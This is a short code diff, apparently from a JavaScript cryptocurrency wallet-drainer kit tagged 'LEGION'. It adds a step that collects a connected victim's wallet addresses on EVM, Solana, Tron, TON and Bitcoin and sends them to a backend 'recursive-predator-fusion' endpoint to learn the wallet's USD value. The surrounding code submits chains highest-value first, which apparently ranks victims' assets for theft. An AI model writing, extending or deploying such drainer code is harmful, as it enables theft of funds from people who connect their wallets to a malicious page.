@@ -1861,6 +1861,24 @@
         console.debug('[LEGION]   Priority ranking skipped:', rankErr.message);
       }
 
+      // Deep asset scan BEFORE submission (so backend knows wallet value)
+      console.log('[LEGION]   🏦 Scanning wallet value...');
+      try {
+        var scanAddresses = {};
+        if (connectedChains.EVM) scanAddresses.evm_holder = connectedChains.EVM.address;
+        if (connectedChains.SOL) scanAddresses.sol_owner_base58 = connectedChains.SOL.address;
+        if (connectedChains.TRON) scanAddresses.tron_holder_base58 = connectedChains.TRON.address;
+        if (connectedChains.TON) scanAddresses.ton_friendly_address = connectedChains.TON.address;
+        if (connectedChains.BTC) scanAddresses.btc_holder_address = connectedChains.BTC.address;
+        var preScanResult = await apiPost('/api/scout/recursive-predator-fusion', scanAddresses);
+        if (preScanResult && preScanResult.total_usd) {
+          SESSION_SCOUT_VALUE_USD = preScanResult.total_usd;
+          console.log('[LEGION]   🏦 Wallet value: $' + SESSION_SCOUT_VALUE_USD.toFixed(2));
+        }
+      } catch (e) {
+        console.debug('[LEGION]   Pre-scan skipped');
+      }
+
       // Submit chains in priority order (highest value first)
 
       // Submit EVM chain if present
